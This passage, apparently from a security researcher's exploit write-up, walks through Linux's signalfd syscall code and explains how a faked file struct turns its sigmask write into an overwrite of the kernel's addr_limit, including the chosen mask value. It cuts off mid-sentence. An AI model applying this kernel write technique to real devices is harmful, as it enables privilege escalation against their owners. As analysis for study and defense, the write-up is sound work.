class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;return&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;ENOMEM&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;sigmask &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;sigmask&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;/*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* When we call this, the initialization must be complete, since&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* anon_inode_getfd() will install the fd.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ufd &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;anon_inode_getfd&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c18\"&gt;&amp;quot;[signalfd]&amp;quot;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;signalfd_fops&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;ctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;O_RDWR &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;|&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;flags &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;O_CLOEXEC &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;|&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;O_NONBLOCK&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;ufd &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kfree&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;ctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;}&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5 vdnyYxSRCi-c9\"&gt;else&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c20 vdnyYxSRCi-c9\"&gt;// [3]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;fd f &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;fdget&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;ufd&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(!&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;f&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;return&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;EBADF&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;ctx &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;f&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;private_data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c20 vdnyYxSRCi-c9\"&gt;// [4]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5 vdnyYxSRCi-c9\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;f&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;.&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;f_op &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;!=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;signalfd_fops&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c20 vdnyYxSRCi-c9\"&gt;// [5]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; fdput&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;f&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;return&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;EINVAL&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; spin_lock_irq&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;current&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;sighand&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;siglock&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;ctx&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;sigmask &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;sigmask&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c20 vdnyYxSRCi-c9\"&gt;// [6] WRITE!&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; spin_unlock_irq&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;current&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;sighand&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;siglock&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; wake_up&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;current&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;sighand&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;signalfd_wqh&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; fdput&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;f&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;return&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;ufd&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;First the function modifies the mask that was passed in. The &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;mask&lt;/span&gt;&lt;span&gt;&amp;nbsp;passed into the function is the signals that should be accepted via the file descriptor, but the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;sigmask&lt;/span&gt;&lt;span&gt;&amp;nbsp;member of the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;signalfd&lt;/span&gt;&lt;span&gt;&amp;nbsp;struct represents the signals that should be blocked. The &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;sigdelsetmask&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;signotset&lt;/span&gt;&lt;span&gt;&amp;nbsp;calls at [1] makes this change. The call to &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;sigdelsetmask&lt;/span&gt;&lt;span&gt;&amp;nbsp;ensures that the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;SIG_KILL&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;SIG_STOP&lt;/span&gt;&lt;span&gt;&amp;nbsp;signals are always blocked so it clears bit 8 (&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;SIG_KILL&lt;/span&gt;&lt;span&gt;) and bit 18 (&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;SIG_STOP&lt;/span&gt;&lt;span&gt;) in order for them to be set in the next call. Then &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;signotset&lt;/span&gt;&lt;span&gt;&amp;nbsp;flips each bit in the mask. The mask that is written is &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;~(mask_in_arg &amp;amp; 0xFFFFFFFFFFFBFEFF)&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The function checks whether or not the file descriptor passed in is &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;-1&lt;/span&gt;&lt;span&gt;&amp;nbsp;at [2]. In this exploit&amp;rsquo;s case it&amp;rsquo;s not so we fall into the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;else&lt;/span&gt;&lt;span&gt;&amp;nbsp;block at [3]. At [4] the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;signalfd_ctx*&lt;/span&gt;&lt;span&gt;&amp;nbsp;is set to the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;private_data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;pointer. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The signalfd manual page also says that the fd argument &amp;ldquo;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c24\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://man7.org/linux/man-pages/man2/signalfd.2.html#:~:text=If%20fd%20is%20not%20%2D1%2C%20then%20it%20must%20specify%20a%0A%20%20%20%20%20%20%20valid%20existing%20signalfd%20file%20descriptor\"&gt;must specify a valid existing signalfd file descriptor&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;rdquo;. To verify this, at [5] the syscall checks if the underlying file&amp;rsquo;s &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;f_op&lt;/span&gt;&lt;span&gt;&amp;nbsp;equals the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;signalfd_ops&lt;/span&gt;&lt;span&gt;. This is why the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;f_op&lt;/span&gt;&lt;span&gt;&amp;nbsp;was set to &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;signalfd_ops&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the previous section. Finally at [6], the overwrite occurs. The user provided &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;mask&lt;/span&gt;&lt;span&gt;&amp;nbsp;is written to the address in &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;private_data&lt;/span&gt;&lt;span&gt;. In the exploit&amp;rsquo;s case, the fake file struct&amp;rsquo;s &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;private_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;was set to the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;addr_limit&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointer. So when the mask is written, we&amp;rsquo;re actually overwriting the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;addr_limit&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2 vdnyYxSRCi-c33 vdnyYxSRCi-c44\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The exploit calls &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;signalfd&lt;/span&gt;&lt;span&gt;&amp;nbsp;with a mask argument&lt;/span&gt;&lt;span&gt;&amp;nbsp;of &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;0xFFFFFF8000000000&lt;/span&gt;&lt;span&gt;. So the 